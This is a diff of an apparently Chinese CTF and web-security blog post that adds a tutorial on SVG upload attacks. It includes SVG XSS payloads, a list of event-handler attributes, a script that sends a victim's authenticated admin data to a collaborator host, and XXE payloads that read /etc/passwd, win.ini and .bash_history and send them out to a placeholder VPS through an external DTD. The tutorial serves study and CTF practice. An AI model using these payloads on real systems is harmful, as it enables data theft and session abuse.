@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://azumisaki.github.io/img/7.jpeg">
 <meta property="article:published_time" content="2026-04-07T10:30:22.000Z">
-<meta property="article:modified_time" content="2026-05-07T13:03:15.675Z">
+<meta property="article:modified_time" content="2026-05-07T13:36:28.048Z">
 <meta property="article:author" content="AzumiSaki">
 <meta property="article:tag" content="XEE漏洞">
 <meta name="twitter:card" content="summary_large_image">
@@ -240,7 +240,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.7k 字
+          3.1k 字
         
       </span>
     
@@ -251,7 +251,7 @@
         
         
         
-          15 分钟
+          27 分钟
         
       </span>
     
@@ -378,6 +378,115 @@
 <p><img src="/img/0xGame2025/9.png" srcset="/img/loading.gif" lazyload></p>
 <p>拿到flag</p>
 <h2 id="有关SVG文件的上传漏洞"><a href="#有关SVG文件的上传漏洞" class="headerlink" title="有关SVG文件的上传漏洞"></a>有关SVG文件的上传漏洞</h2><h3 id="1-svg造成的xss漏洞"><a href="#1-svg造成的xss漏洞" class="headerlink" title="1.svg造成的xss漏洞"></a>1.svg造成的xss漏洞</h3><p>首先svg的payload构建方式跟xxe是差不多的</p>
+<p>SVG 中支持 <code>script</code> 元素，等同于 HTML 中的 <code>script</code> 元素，因此这个位置是面向脚本的。任何定义在<code>script</code>元素中的函数拥有一个跨当前文档的全局范围。</p>
+<p>例：用浏览器打开下面的 SVG 图片就会造成 XSS</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.1&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">&quot;50&quot;</span> <span class="hljs-attr">r</span>=<span class="hljs-string">&quot;40&quot;</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">&quot;black&quot;</span> <span class="hljs-attr">stroke-width</span>=<span class="hljs-string">&quot;2&quot;</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">&quot;red&quot;</span> /&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>除此之外，你还可以在 SVG 标签中加入 DOM &#x2F; HTML 层面的全局属性，例如 <code>onclick</code>、<code>onload</code>等属性</p>
+<p>以下为在 SVG 中可使用、且能直接配合 <code>alert()</code> 的所有 DOM &#x2F; HTML 全局事件属性（Event Handler Attributes）完整列表。</p>
+<ul>
+<li><strong>鼠标事件（Mouse Events）</strong></li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml">onclick //鼠标单击触发<br>oncontextmenu //右键菜单（右键点击）<br>ondblclick //鼠标双击<br>onmousedown //鼠标按下<br>onmouseenter //鼠标离开，但不会因为子元素导致重复触发<br>onmouseleave //鼠标进入，但不会因为子元素导致重复触发<br>onmousemove //鼠标在元素上移动<br>onmouseout //鼠标移出元素<br>onmouseover //从外部进入元素范围时触发<br>onmouseup //鼠标松开<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>键盘事件（Keyboard Events）</strong></li>
+</ul>
+<p>（注：SVG 也能接收键盘事件, 默认不接受，除非你加上 <code>tabindex=&quot;0&quot;</code> 才能获得焦点）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">onkeydown //按键按下<br>onkeypress //输入可见字符（新标准已废弃，但仍可用）<br>onkeyup //按键松开<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>焦点事件（Focus Events）</strong></li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">onblur //失去焦点时触发<br>onfocus //取得焦点时触发<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>输入事件（Input &#x2F; Change）</strong></li>
+</ul>
+<p>主要用于可编辑 SVG 或 SVG 外层嵌套表单时，通常 SVG 不直接使用，但若内部有 <code>&lt;foreignObject&gt;</code> 或可编辑节点则能触发。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">onchange //内容变化完成后触发<br>oninput //输入时触发<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>拖放事件（Drag &amp; Drop）</strong></li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">ondrag //正在拖动<br>ondrop //放下拖动对象<br>ondragstart //开始拖动<br>ondragend //结束拖动<br>ondragenter //被拖东西进入元素<br>ondragleave //拖动对象离开<br>ondragover //拖动对象停在上面<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>剪贴板事件（Clipboard Events）</strong></li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">oncopy //复制时触发<br>oncut //剪切时触发<br>onpaste //粘贴时触发<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>触摸事件（Touch Events）（移动端）</strong></li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">ontouchstart //手指触摸开始<br>ontouchend //手指抬起<br>ontouchmove //手指移动<br>ontouchcancel //系统取消触摸<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>指针事件（Pointer Events）</strong></li>
+</ul>
+<p>（现代浏览器通用，指针可以是鼠标、触摸、触控笔等）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">onpointerdown //指针按下（按下瞬间触发）<br>onpointerup //指针松开（按下结束）<br>onpointermove //指针移动<br>onpointerenter //指针进入元素（不冒泡）<br>onpointerleave //指针离开元素（不冒泡）<br>onpointerover //指针移入元素（会冒泡）<br>onpointerout //指针移出元素（会冒泡）<br>onpointercancel //指针被取消（系统取消交互）<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>滚动事件（Wheel Events）</strong></li>
+</ul>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">onwheel <span class="hljs-comment">//鼠标滚轮</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>加载事件（Load Events）</strong></li>
+</ul>
+<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs hsp">onload <span class="hljs-comment">//元素加载完成</span><br><span class="hljs-keyword">onerror</span> <span class="hljs-comment">//加载错误</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>窗口事件（Window event）</strong></p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">onscroll <span class="hljs-comment">//滚动发生</span><br>onresize <span class="hljs-comment">//尺寸变化（通常用在 &lt;svg&gt; 外层）</span><br></code></pre></td></tr></table></figure>
+
+<p>除了上述属性，还有些属性本身不会执行 JS，但由于它们具备“事件绑定能力”或“可被事件驱动”，因此能导致某些动作在事件发生时触发，例如 <code>begin</code>、<code>end</code>、<code>restart</code>、<code>repeatCount</code>和<code>repeatDur</code>等等</p>
+<p>例1：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg <span class="hljs-attribute">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;&lt;/svg&gt;<br></code></pre></td></tr></table></figure>
+
+<p>例2：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 正常的SVG图形内容 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">polygon</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">&quot;#00B0D9&quot;</span> <span class="hljs-attr">points</span>=<span class="hljs-string">&quot;41.5,40 38.7,39.2 38.7,47.1 41.5,47.1&quot;</span>/&gt;</span><br>  <span class="hljs-comment">&lt;!-- 隐藏在SVG中的恶意脚本 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript">    xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> xhr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript">        xhr2.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;http://XXXX.burpcollaborator.net/&quot;</span>);</span><br><span class="language-javascript">        xhr2.<span class="hljs-title function_">send</span>(xhr.<span class="hljs-property">responseText</span>);</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;   </span><br><span class="language-javascript">    xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://www.target.com/profile/admin&quot;</span>);</span><br><span class="language-javascript">    xhr.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;</span><br><span class="language-javascript">    xhr.<span class="hljs-title function_">send</span>();</span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>用户A 访问了包含恶意脚本的页面</li>
+<li>恶意脚本在 用户A 的浏览器中执行</li>
+<li>XMLHttpRequest 使用 用户A 的cookies访问 &#x2F;profile&#x2F;admin</li>
+<li>获取 用户A 自己的管理员数据</li>
+<li>将 用户A 的数据发送给攻击者</li>
+</ol>
+<h2 id="SVG造成XXE"><a href="#SVG造成XXE" class="headerlink" title="SVG造成XXE"></a>SVG造成XXE</h2><p>SVG 是基于 XML 的矢量图，因此支持 Entity (实体)功能</p>
+<p>XXE 一般也分为有回显和无回显情况</p>
+<p>有回显情况下，比较简单，直接读取就行：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>无回显情况下，则相对比较复杂：</p>
+<p>PHP 处理代码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">libxml_disable_entity_loader(false);</span><br><span class="hljs-meta">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="hljs-meta">$dom = new DOMDocument();</span><br><span class="hljs-meta">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>xml.dtd：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY %file <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///C:/WINDOWS/win.ini&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY %start <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://YOUR-VPS-IP:1234/?%file;&#x27;&gt;&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- &amp;#x25;会被xml解析成% --&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">Note</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY %remote <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://YOUR-VPS-IP/xml.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %remote;</span><br><span class="hljs-meta">    %start;</span><br><span class="hljs-meta">    %send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>XXE 实现外带数据的整个流程：</p>
+<ol>
+<li>首先我们payload中的 %remote 去获取 vps 上的 xml.dtd</li>
+<li>然后 xml.dtd 中的 %start 去调用 %file</li>
+<li>%file 获取服务器上的 C:&#x2F;WINDOWS&#x2F;win.ini 文件并将他 base64 编码</li>
+<li>最后通过 %send 将数据发送到vps监听的1234端口上</li>
+</ol>
+<p>结合 SVG，通过加载外部一个 dtd 文件，然后把读取结果以 HTTP 请求的方式发送到自己的 VPS：</p>
+<p>1.svg：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">Note</span> [ </span><br><span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lab</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///home/r1ck/.bash_history&quot;</span>&gt;</span></span><br><span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY %file <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history&quot;</span>&gt;</span></span><br><span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY %remote <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://YOUR-VPS-IP:1234/xml.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %remote;</span><br><span class="hljs-meta">	%start;</span><br><span class="hljs-meta">	%send;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span> <span class="hljs-attr">font-size</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><span class="hljs-symbol">&amp;lab;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>xml.dtd：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://YOUR-VPS-IP:1234/?%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>或者是</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://YOUR-VPS-IP:1234/?%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>1.svg 和 xml.dtd 放到 vps 上，然后在 vps 上监听 1234 端口，再在网页提交 1.svg 的链接即可成功读取</p>
 
                 
               </div>
